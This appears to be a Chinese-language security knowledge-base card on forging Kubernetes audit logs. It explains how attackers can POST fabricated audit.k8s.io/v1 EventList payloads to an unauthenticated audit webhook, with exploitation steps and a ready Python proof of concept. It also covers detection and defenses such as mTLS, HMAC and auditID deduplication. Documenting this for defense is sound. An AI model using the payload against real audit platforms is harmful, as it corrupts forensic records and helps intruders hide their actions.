---
id: cloud-k8s-audit-webhook-forged-eventlist
title: K8s 审计 webhook 未鉴权：向统一审计平台提交伪造的 audit.k8s.io/v1 EventList 注入虚假日志
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-audit-webhook-forged-eventlist
tags:
- cloud
- k8s
- audit
- webhook
- log-injection
- anti-forensics
- misconfiguration
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V273
  verified_at: '2026-11-07T23:15:33+08:00'
  notes: 已对照原文核对：webhook 抓包的 EventList 结构、Go-http-client/1.1 及 Content-Type、原文 Python POST 脚本与 3.1 节『webhook 地址没有鉴权』结论一致；卡片已如实注明原文未展示平台侧入库结果。未验证点：端点未鉴权与成功写入平台为原文断言/抓包推断，未复现。
url: /docs/cloud/k8s/cloud-k8s-audit-webhook-forged-eventlist/
draft: false
kb_aliases:
- K8s 审计日志伪造
- webhook 未鉴权
- EventList 注入
- audit.k8s.io/v1 伪造
- 统一 k8s 平台日志混淆
- 烟雾弹事件
---

## 一句话结论

企业内部的统一 K8s 平台常把 apiserver 的审计事件转发到一个统一 webhook，若该 webhook 地址没有鉴权，攻击者可以向它 POST 一条格式为 `{"kind":"EventList","apiVersion":"audit.k8s.io/v1", ...}` 的伪造审计事件列表，把任意用户名、requestURI、sourceIPs、responseStatus 等字段写进日志/告警管道，制造“烟雾弹”，增加防守方区分真实与伪造事件的成本。

## 原理

- K8s 审计 webhook 后端接收的 payload 是 `audit.k8s.io/v1` 的 `EventList`（或单条 `Event`）：包含 `kind`、`apiVersion`、`metadata`、`items`，每个 item 是一条审计事件，字段有 `level`、`auditID`、`stage`、`requestURI`、`verb`、`user`（username/groups/extra）、`sourceIPs`、`userAgent`、`objectRef`、`responseStatus`、`requestReceivedTimestamp`、`stageTimestamp` 等。
- 该格式由 apiserver 生成并 POST 到 webhook；如果内部平台的 webhook 端点只做接收/入库，不校验来源身份（无 mTLS/Token/HMAC/IP 白名单），任何能访问该端点的人都可以构造同样的 EventList 提交。
- 伪造的事件可以与真实事件高度相似（相同的 `apiVersion`、字段、时间戳格式），平台难以仅凭结构区分；攻击者可以伪造“其他用户名/其他源 IP/其他操作”的事件，把调查方向引向不存在的攻击者或掩盖真实操作。
- 原文抓包显示 webhook 请求为 `Content-Type: application/json`、`User-Agent: Go-http-client/1.1`，body 是包含多条 audit event 的 EventList；说明 webhook 接收的是明文 JSON，未做来源鉴权。
- 该技巧不改变集群状态，只污染审计/告警数据；危害是取证与溯源成本上升、误报/漏报，属于反取证（anti-forensics）类 Technique。

## 触发条件

- 企业内部存在统一 K8s 管理平台/审计平台，apiserver 配置了 audit webhook（`--audit-webhook-config-file` 等），且平台侧 webhook 接收端点可从攻击者所在网络访问。
- webhook 端点没有鉴权（无 mTLS、无 Token、无 HMAC 签名、无来源 IP 白名单），或鉴权可绕过。
- 攻击者已获得 webhook 地址（抓包、配置泄露、平台页面、内网扫描等）和 EventList 格式。
- 平台的日志/告警消费逻辑信任 webhook 写入的事件，未做来源标记或去重/签名校验。

## 利用步骤

1. 获取 webhook 地址与格式：在已攻陷的节点/容器中抓包（如原文的 Go-http-client 请求），或从 apiserver 审计配置、平台配置、前端接口中获取。
2. 构造伪造 EventList：复制真实事件结构，替换 `user.username`、`sourceIPs`、`requestURI`、`verb`、`objectRef`、`responseStatus`、时间戳等字段；可一次提交多条（`items` 数组）。
3. POST 到 webhook：`Content-Type: application/json`，body 为 EventList；原文示例用 Python `requests.post("http://127.0.0.1/", data=test_str, headers={'Content-Type':'application/json'})`。
4. 观察平台日志/告警是否出现伪造事件；若平台按用户/IP 聚合告警，可批量伪造不同来源的事件制造噪声。
5. 与 `X-Forwarded-For`/`X-Real-IP` 污染（见 [[cloud-k8s-audit-sourceips-xff-xrealip-spoof]]）组合，进一步稀释真实来源。

## PoC

```python
import requests

# 原文抓包得到的 EventList 结构；字段可任意替换
test_str = """
{
   "kind": "EventList",
   "apiVersion": "audit.k8s.io/v1",
   "metadata": {},
   "items": [
      {
         "level": "Metadata",
         "auditID": "415774d8-93ed-489c-a1ae-47fe6a501d37",
         "stage": "RequestReceived",
         "requestURI": "/api/v1/configmaps",
         "verb": "list",
         "user": {
            "username": "system:serviceaccount:default:lufeitest3",
            "uid": "178c3130-6925-4d81-8ce4-5d1cd61fd7f1",
            "groups": ["system:serviceaccount:default", "system:authenticated"],
            "extra": {
               "authentication.kubernetes.io/credential-id": ["JTI=53561be6-c4c0-4cbe-9552-cf149868ce19"],
               "authentication.kubernetes.io/node-name": ["minikube"],
               "authentication.kubernetes.io/pod-name": ["agones-controller-6b7f66b857-57ffx"]
            }
         },
         "sourceIPs": ["10.244.0.89"],
         "userAgent": "curl",
         "objectRef": {"resource": "leases", "namespace": "default", "name": "agones-controller-lock", "apiGroup": "coordination.k8s.io", "apiVersion": "v1"},
         "requestReceivedTimestamp": "2024-08-02T09:57:28.634829Z",
         "stageTimestamp": "2024-08-02T09:57:28.634829Z"
      }
   ]
}
"""

rsp = requests.post("http://127.0.0.1/", data=test_str,
                    headers={'Content-Type': 'application/json'})
print(rsp.text)
```

（原文未展示 webhook 的响应与平台侧入库结果；实际利用需确认端点可达且无鉴权。）

## 变体与关联

- 可伪造的事件类型：`RequestReceived`/`ResponseComplete`、`Metadata`/`Request`/`RequestResponse` 级别；字段越完整越像真实事件。
- 可批量提交 `items` 数组，一次注入多条；也可重复提交相同 `auditID` 测试平台是否去重。
- 与来源 IP 污染组合：[[cloud-k8s-audit-sourceips-xff-xrealip-spoof]]。
- K8s 取证/日志分析（防守视角）：[[cloud-k8s-forensic-cluster-workload-rebuild]]、[[defense-forensics-web-access-log-attacker-ip-triage]]。

## 检测与防御

- webhook 鉴权：为审计 webhook 配置 mTLS 客户端证书、Token/HMAC 签名或来源 IP 白名单；apiserver 与平台之间只允许受信通道。
- 端点隐藏：使用随机化/不可猜测的 URL path（原文建议），降低被扫描/发现概率；但这只是辅助，不能替代鉴权。
- 数据完整性：平台对 apiserver 转发的事件做签名/来源标记，区分“apiserver 写入”和“外部提交”；对 `auditID` 去重，拒绝重复/时间倒序/格式异常的事件。
- 检测：webhook 收到来自非 apiserver 来源 IP/非 Go-http-client（或与集群配置不符的 User-Agent）的请求；事件中的 `sourceIPs`/`user.username` 与集群真实对象/节点不匹配；短时间内大量结构相似但来源分散的事件。
- 响应：发现伪造日志时，以 apiserver 原始审计日志/etcd/节点日志为准做交叉验证，不单一依赖平台聚合视图。
